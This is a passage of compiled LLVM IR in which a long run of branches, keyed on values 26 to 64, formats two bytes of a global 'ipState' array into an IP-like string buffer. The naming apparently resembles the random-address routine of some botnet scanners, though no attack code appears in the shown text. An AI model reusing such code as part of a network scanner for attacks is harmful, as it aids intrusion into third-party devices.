  %271 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %272 = zext i8 %271 to i32
  %273 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %274 = zext i8 %273 to i32
  %275 = call i32 (i8*, i8*, ...) @szprintf(i8* %270, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.212, i32 0, i32 0), i32 %272, i32 %274)
  br label %276

; <label>:276:                                    ; preds = %269, %266
  %277 = load i32, i32* %1, align 4
  %278 = icmp eq i32 %277, 26
  br i1 %278, label %279, label %286

; <label>:279:                                    ; preds = %276
  %280 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %282 = zext i8 %281 to i32
  %283 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %284 = zext i8 %283 to i32
  %285 = call i32 (i8*, i8*, ...) @szprintf(i8* %280, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.213, i32 0, i32 0), i32 %282, i32 %284)
  br label %286

; <label>:286:                                    ; preds = %279, %276
  %287 = load i32, i32* %1, align 4
  %288 = icmp eq i32 %287, 27
  br i1 %288, label %289, label %296

; <label>:289:                                    ; preds = %286
  %290 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %291 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %292 = zext i8 %291 to i32
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %294 = zext i8 %293 to i32
  %295 = call i32 (i8*, i8*, ...) @szprintf(i8* %290, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.214, i32 0, i32 0), i32 %292, i32 %294)
  br label %296

; <label>:296:                                    ; preds = %289, %286
  %297 = load i32, i32* %1, align 4
  %298 = icmp eq i32 %297, 28
  br i1 %298, label %299, label %306

; <label>:299:                                    ; preds = %296
  %300 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %302 = zext i8 %301 to i32
  %303 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %304 = zext i8 %303 to i32
  %305 = call i32 (i8*, i8*, ...) @szprintf(i8* %300, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.215, i32 0, i32 0), i32 %302, i32 %304)
  br label %306

; <label>:306:                                    ; preds = %299, %296
  %307 = load i32, i32* %1, align 4
  %308 = icmp eq i32 %307, 29
  br i1 %308, label %309, label %316

; <label>:309:                                    ; preds = %306
  %310 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %311 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %312 = zext i8 %311 to i32
  %313 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %314 = zext i8 %313 to i32
  %315 = call i32 (i8*, i8*, ...) @szprintf(i8* %310, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.216, i32 0, i32 0), i32 %312, i32 %314)
  br label %316

; <label>:316:                                    ; preds = %309, %306
  %317 = load i32, i32* %1, align 4
  %318 = icmp eq i32 %317, 30
  br i1 %318, label %319, label %326

; <label>:319:                                    ; preds = %316
  %320 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %322 = zext i8 %321 to i32
  %323 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %324 = zext i8 %323 to i32
  %325 = call i32 (i8*, i8*, ...) @szprintf(i8* %320, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i32 0, i32 0), i32 %322, i32 %324)
  br label %326

; <label>:326:                                    ; preds = %319, %316
  %327 = load i32, i32* %1, align 4
  %328 = icmp eq i32 %327, 31
  br i1 %328, label %329, label %336

; <label>:329:                                    ; preds = %326
  %330 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %331 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %332 = zext i8 %331 to i32
  %333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %334 = zext i8 %333 to i32
  %335 = call i32 (i8*, i8*, ...) @szprintf(i8* %330, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.218, i32 0, i32 0), i32 %332, i32 %334)
  br label %336

; <label>:336:                                    ; preds = %329, %326
  %337 = load i32, i32* %1, align 4
  %338 = icmp eq i32 %337, 32
  br i1 %338, label %339, label %346

; <label>:339:                                    ; preds = %336
  %340 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %342 = zext i8 %341 to i32
  %343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %344 = zext i8 %343 to i32
  %345 = call i32 (i8*, i8*, ...) @szprintf(i8* %340, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.219, i32 0, i32 0), i32 %342, i32 %344)
  br label %346

; <label>:346:                                    ; preds = %339, %336
  %347 = load i32, i32* %1, align 4
  %348 = icmp eq i32 %347, 33
  br i1 %348, label %349, label %356

; <label>:349:                                    ; preds = %346
  %350 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %352 = zext i8 %351 to i32
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %354 = zext i8 %353 to i32
  %355 = call i32 (i8*, i8*, ...) @szprintf(i8* %350, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.220, i32 0, i32 0), i32 %352, i32 %354)
  br label %356

; <label>:356:                                    ; preds = %349, %346
  %357 = load i32, i32* %1, align 4
  %358 = icmp eq i32 %357, 34
  br i1 %358, label %359, label %366

; <label>:359:                                    ; preds = %356
  %360 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %362 = zext i8 %361 to i32
  %363 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %364 = zext i8 %363 to i32
  %365 = call i32 (i8*, i8*, ...) @szprintf(i8* %360, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.221, i32 0, i32 0), i32 %362, i32 %364)
  br label %366

; <label>:366:                                    ; preds = %359, %356
  %367 = load i32, i32* %1, align 4
  %368 = icmp eq i32 %367, 35
  br i1 %368, label %369, label %376

; <label>:369:                                    ; preds = %366
  %370 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %371 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %372 = zext i8 %371 to i32
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %374 = zext i8 %373 to i32
  %375 = call i32 (i8*, i8*, ...) @szprintf(i8* %370, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.222, i32 0, i32 0), i32 %372, i32 %374)
  br label %376

; <label>:376:                                    ; preds = %369, %366
  %377 = load i32, i32* %1, align 4
  %378 = icmp eq i32 %377, 36
  br i1 %378, label %379, label %386

; <label>:379:                                    ; preds = %376
  %380 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %381 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %382 = zext i8 %381 to i32
  %383 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %384 = zext i8 %383 to i32
  %385 = call i32 (i8*, i8*, ...) @szprintf(i8* %380, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.201, i32 0, i32 0), i32 %382, i32 %384)
  br label %386

; <label>:386:                                    ; preds = %379, %376
  %387 = load i32, i32* %1, align 4
  %388 = icmp eq i32 %387, 37
  br i1 %388, label %389, label %396

; <label>:389:                                    ; preds = %386
  %390 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %391 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %392 = zext i8 %391 to i32
  %393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %394 = zext i8 %393 to i32
  %395 = call i32 (i8*, i8*, ...) @szprintf(i8* %390, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.223, i32 0, i32 0), i32 %392, i32 %394)
  br label %396

; <label>:396:                                    ; preds = %389, %386
  %397 = load i32, i32* %1, align 4
  %398 = icmp eq i32 %397, 38
  br i1 %398, label %399, label %406

; <label>:399:                                    ; preds = %396
  %400 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %401 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %402 = zext i8 %401 to i32
  %403 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %404 = zext i8 %403 to i32
  %405 = call i32 (i8*, i8*, ...) @szprintf(i8* %400, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.224, i32 0, i32 0), i32 %402, i32 %404)
  br label %406

; <label>:406:                                    ; preds = %399, %396
  %407 = load i32, i32* %1, align 4
  %408 = icmp eq i32 %407, 39
  br i1 %408, label %409, label %416

; <label>:409:                                    ; preds = %406
  %410 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %411 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %412 = zext i8 %411 to i32
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %414 = zext i8 %413 to i32
  %415 = call i32 (i8*, i8*, ...) @szprintf(i8* %410, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.225, i32 0, i32 0), i32 %412, i32 %414)
  br label %416

; <label>:416:                                    ; preds = %409, %406
  %417 = load i32, i32* %1, align 4
  %418 = icmp eq i32 %417, 40
  br i1 %418, label %419, label %426

; <label>:419:                                    ; preds = %416
  %420 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %421 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %422 = zext i8 %421 to i32
  %423 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %424 = zext i8 %423 to i32
  %425 = call i32 (i8*, i8*, ...) @szprintf(i8* %420, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.226, i32 0, i32 0), i32 %422, i32 %424)
  br label %426

; <label>:426:                                    ; preds = %419, %416
  %427 = load i32, i32* %1, align 4
  %428 = icmp eq i32 %427, 41
  br i1 %428, label %429, label %436

; <label>:429:                                    ; preds = %426
  %430 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %432 = zext i8 %431 to i32
  %433 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %434 = zext i8 %433 to i32
  %435 = call i32 (i8*, i8*, ...) @szprintf(i8* %430, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.227, i32 0, i32 0), i32 %432, i32 %434)
  br label %436

; <label>:436:                                    ; preds = %429, %426
  %437 = load i32, i32* %1, align 4
  %438 = icmp eq i32 %437, 42
  br i1 %438, label %439, label %446

; <label>:439:                                    ; preds = %436
  %440 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %441 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %442 = zext i8 %441 to i32
  %443 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %444 = zext i8 %443 to i32
  %445 = call i32 (i8*, i8*, ...) @szprintf(i8* %440, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.228, i32 0, i32 0), i32 %442, i32 %444)
  br label %446

; <label>:446:                                    ; preds = %439, %436
  %447 = load i32, i32* %1, align 4
  %448 = icmp eq i32 %447, 43
  br i1 %448, label %449, label %456

; <label>:449:                                    ; preds = %446
  %450 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %452 = zext i8 %451 to i32
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %454 = zext i8 %453 to i32
  %455 = call i32 (i8*, i8*, ...) @szprintf(i8* %450, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.229, i32 0, i32 0), i32 %452, i32 %454)
  br label %456

; <label>:456:                                    ; preds = %449, %446
  %457 = load i32, i32* %1, align 4
  %458 = icmp eq i32 %457, 44
  br i1 %458, label %459, label %466

; <label>:459:                                    ; preds = %456
  %460 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %461 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %462 = zext i8 %461 to i32
  %463 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %464 = zext i8 %463 to i32
  %465 = call i32 (i8*, i8*, ...) @szprintf(i8* %460, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.230, i32 0, i32 0), i32 %462, i32 %464)
  br label %466

; <label>:466:                                    ; preds = %459, %456
  %467 = load i32, i32* %1, align 4
  %468 = icmp eq i32 %467, 45
  br i1 %468, label %469, label %476

; <label>:469:                                    ; preds = %466
  %470 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %471 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %472 = zext i8 %471 to i32
  %473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %474 = zext i8 %473 to i32
  %475 = call i32 (i8*, i8*, ...) @szprintf(i8* %470, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.231, i32 0, i32 0), i32 %472, i32 %474)
  br label %476

; <label>:476:                                    ; preds = %469, %466
  %477 = load i32, i32* %1, align 4
  %478 = icmp eq i32 %477, 46
  br i1 %478, label %479, label %486

; <label>:479:                                    ; preds = %476
  %480 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %481 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %482 = zext i8 %481 to i32
  %483 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %484 = zext i8 %483 to i32
  %485 = call i32 (i8*, i8*, ...) @szprintf(i8* %480, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.232, i32 0, i32 0), i32 %482, i32 %484)
  br label %486

; <label>:486:                                    ; preds = %479, %476
  %487 = load i32, i32* %1, align 4
  %488 = icmp eq i32 %487, 47
  br i1 %488, label %489, label %496

; <label>:489:                                    ; preds = %486
  %490 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %491 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %492 = zext i8 %491 to i32
  %493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %494 = zext i8 %493 to i32
  %495 = call i32 (i8*, i8*, ...) @szprintf(i8* %490, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.233, i32 0, i32 0), i32 %492, i32 %494)
  br label %496

; <label>:496:                                    ; preds = %489, %486
  %497 = load i32, i32* %1, align 4
  %498 = icmp eq i32 %497, 48
  br i1 %498, label %499, label %506

; <label>:499:                                    ; preds = %496
  %500 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %501 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %502 = zext i8 %501 to i32
  %503 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %504 = zext i8 %503 to i32
  %505 = call i32 (i8*, i8*, ...) @szprintf(i8* %500, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.234, i32 0, i32 0), i32 %502, i32 %504)
  br label %506

; <label>:506:                                    ; preds = %499, %496
  %507 = load i32, i32* %1, align 4
  %508 = icmp eq i32 %507, 49
  br i1 %508, label %509, label %516

; <label>:509:                                    ; preds = %506
  %510 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %511 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %512 = zext i8 %511 to i32
  %513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %514 = zext i8 %513 to i32
  %515 = call i32 (i8*, i8*, ...) @szprintf(i8* %510, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.235, i32 0, i32 0), i32 %512, i32 %514)
  br label %516

; <label>:516:                                    ; preds = %509, %506
  %517 = load i32, i32* %1, align 4
  %518 = icmp eq i32 %517, 50
  br i1 %518, label %519, label %526

; <label>:519:                                    ; preds = %516
  %520 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %522 = zext i8 %521 to i32
  %523 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %524 = zext i8 %523 to i32
  %525 = call i32 (i8*, i8*, ...) @szprintf(i8* %520, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.236, i32 0, i32 0), i32 %522, i32 %524)
  br label %526

; <label>:526:                                    ; preds = %519, %516
  %527 = load i32, i32* %1, align 4
  %528 = icmp eq i32 %527, 51
  br i1 %528, label %529, label %536

; <label>:529:                                    ; preds = %526
  %530 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %531 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %532 = zext i8 %531 to i32
  %533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %534 = zext i8 %533 to i32
  %535 = call i32 (i8*, i8*, ...) @szprintf(i8* %530, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i32 %532, i32 %534)
  br label %536

; <label>:536:                                    ; preds = %529, %526
  %537 = load i32, i32* %1, align 4
  %538 = icmp eq i32 %537, 52
  br i1 %538, label %539, label %546

; <label>:539:                                    ; preds = %536
  %540 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %542 = zext i8 %541 to i32
  %543 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %544 = zext i8 %543 to i32
  %545 = call i32 (i8*, i8*, ...) @szprintf(i8* %540, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.237, i32 0, i32 0), i32 %542, i32 %544)
  br label %546

; <label>:546:                                    ; preds = %539, %536
  %547 = load i32, i32* %1, align 4
  %548 = icmp eq i32 %547, 53
  br i1 %548, label %549, label %556

; <label>:549:                                    ; preds = %546
  %550 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %551 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %552 = zext i8 %551 to i32
  %553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %554 = zext i8 %553 to i32
  %555 = call i32 (i8*, i8*, ...) @szprintf(i8* %550, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.238, i32 0, i32 0), i32 %552, i32 %554)
  br label %556

; <label>:556:                                    ; preds = %549, %546
  %557 = load i32, i32* %1, align 4
  %558 = icmp eq i32 %557, 54
  br i1 %558, label %559, label %566

; <label>:559:                                    ; preds = %556
  %560 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %561 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %562 = zext i8 %561 to i32
  %563 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %564 = zext i8 %563 to i32
  %565 = call i32 (i8*, i8*, ...) @szprintf(i8* %560, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.239, i32 0, i32 0), i32 %562, i32 %564)
  br label %566

; <label>:566:                                    ; preds = %559, %556
  %567 = load i32, i32* %1, align 4
  %568 = icmp eq i32 %567, 55
  br i1 %568, label %569, label %576

; <label>:569:                                    ; preds = %566
  %570 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %571 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %572 = zext i8 %571 to i32
  %573 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %574 = zext i8 %573 to i32
  %575 = call i32 (i8*, i8*, ...) @szprintf(i8* %570, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.240, i32 0, i32 0), i32 %572, i32 %574)
  br label %576

; <label>:576:                                    ; preds = %569, %566
  %577 = load i32, i32* %1, align 4
  %578 = icmp eq i32 %577, 56
  br i1 %578, label %579, label %586

; <label>:579:                                    ; preds = %576
  %580 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %581 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %582 = zext i8 %581 to i32
  %583 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %584 = zext i8 %583 to i32
  %585 = call i32 (i8*, i8*, ...) @szprintf(i8* %580, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.241, i32 0, i32 0), i32 %582, i32 %584)
  br label %586

; <label>:586:                                    ; preds = %579, %576
  %587 = load i32, i32* %1, align 4
  %588 = icmp eq i32 %587, 57
  br i1 %588, label %589, label %596

; <label>:589:                                    ; preds = %586
  %590 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %591 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %592 = zext i8 %591 to i32
  %593 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %594 = zext i8 %593 to i32
  %595 = call i32 (i8*, i8*, ...) @szprintf(i8* %590, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.242, i32 0, i32 0), i32 %592, i32 %594)
  br label %596

; <label>:596:                                    ; preds = %589, %586
  %597 = load i32, i32* %1, align 4
  %598 = icmp eq i32 %597, 58
  br i1 %598, label %599, label %606

; <label>:599:                                    ; preds = %596
  %600 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %601 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %602 = zext i8 %601 to i32
  %603 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %604 = zext i8 %603 to i32
  %605 = call i32 (i8*, i8*, ...) @szprintf(i8* %600, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.243, i32 0, i32 0), i32 %602, i32 %604)
  br label %606

; <label>:606:                                    ; preds = %599, %596
  %607 = load i32, i32* %1, align 4
  %608 = icmp eq i32 %607, 59
  br i1 %608, label %609, label %616

; <label>:609:                                    ; preds = %606
  %610 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %611 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %612 = zext i8 %611 to i32
  %613 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %614 = zext i8 %613 to i32
  %615 = call i32 (i8*, i8*, ...) @szprintf(i8* %610, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.244, i32 0, i32 0), i32 %612, i32 %614)
  br label %616

; <label>:616:                                    ; preds = %609, %606
  %617 = load i32, i32* %1, align 4
  %618 = icmp eq i32 %617, 60
  br i1 %618, label %619, label %626

; <label>:619:                                    ; preds = %616
  %620 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %621 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %622 = zext i8 %621 to i32
  %623 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %624 = zext i8 %623 to i32
  %625 = call i32 (i8*, i8*, ...) @szprintf(i8* %620, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.245, i32 0, i32 0), i32 %622, i32 %624)
  br label %626

; <label>:626:                                    ; preds = %619, %616
  %627 = load i32, i32* %1, align 4
  %628 = icmp eq i32 %627, 61
  br i1 %628, label %629, label %636

; <label>:629:                                    ; preds = %626
  %630 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %631 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %632 = zext i8 %631 to i32
  %633 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %634 = zext i8 %633 to i32
  %635 = call i32 (i8*, i8*, ...) @szprintf(i8* %630, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.246, i32 0, i32 0), i32 %632, i32 %634)
  br label %636

; <label>:636:                                    ; preds = %629, %626
  %637 = load i32, i32* %1, align 4
  %638 = icmp eq i32 %637, 62
  br i1 %638, label %639, label %646

; <label>:639:                                    ; preds = %636
  %640 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %641 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %642 = zext i8 %641 to i32
  %643 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %644 = zext i8 %643 to i32
  %645 = call i32 (i8*, i8*, ...) @szprintf(i8* %640, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.247, i32 0, i32 0), i32 %642, i32 %644)
  br label %646

; <label>:646:                                    ; preds = %639, %636
  %647 = load i32, i32* %1, align 4
  %648 = icmp eq i32 %647, 63
  br i1 %648, label %649, label %656

; <label>:649:                                    ; preds = %646
  %650 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %651 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %652 = zext i8 %651 to i32
  %653 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %654 = zext i8 %653 to i32
  %655 = call i32 (i8*, i8*, ...) @szprintf(i8* %650, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.248, i32 0, i32 0), i32 %652, i32 %654)
  br label %656

; <label>:656:                                    ; preds = %649, %646
  %657 = load i32, i32* %1, align 4
  %658 = icmp eq i32 %657, 64
  br i1 %658, label %659, label %666

; <label>:659:                                    ; preds = %656
  %660 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %661 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %662 = zext i8 %661 to i32
  %663 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %664 = zext i8 %663 to i32
  %665 = call i32 (i8*, i8*, ...) @szprintf(i8* %660, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.249, i32 0, i32 0), i32 %662, i32 %664)
  br label %666

; <label>:666:                                    ; preds = %659, %656
  %667 = load i32, i32* %1, align 4
